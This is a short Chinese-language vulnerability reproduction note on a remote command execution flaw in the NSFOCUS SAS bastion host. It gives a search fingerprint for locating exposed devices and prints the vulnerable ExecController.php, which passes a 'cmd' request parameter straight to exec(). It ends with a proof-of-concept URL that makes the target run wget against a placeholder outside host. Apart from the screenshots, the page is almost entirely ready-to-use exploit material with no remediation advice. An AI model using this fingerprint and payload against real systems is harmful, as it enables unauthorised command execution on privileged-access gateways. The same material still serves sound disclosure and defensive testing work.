# 绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞描述

绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

body="'/needUsbkey.php?username='"

## 漏洞复现

登陆页面

![image-20230810161951661](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163322490-1233521306.png)

漏洞存在于文件 ExecController.php 文件中

![image-20230810162130389](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163324738-1177872246.png)

```php
<?php
  require_once 'Nsc/Websvc/Response.php';
class ExecController extends Cavy_Controller_Action {

  var $models = 'no';

  public function index() {
    $command = $this->_params['cmd'];
    $ret = 0;
    $output = array();
    exec($command,$output,$ret);
    $result = new StdClass;
    if ($ret != 0) {
      $result->code = Nsc_Websvc_Response::EXEC_ERROR;
      $result->text = "exec error";
    }
    else {
      $result->code = Nsc_Websvc_Response::SUCCESS;
      //			$result->text = implode("\n",$output);
      $result->text = "WEBSVC OK";
    }
    $this->_render(array('result'=>$result),'/websvc/result');
  }
}
?>
```

验证POC

```php
/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
```

![image-20230810162224581](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163328304-1395783169.png)

![image-20230810162252732](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163331933-881438300.png)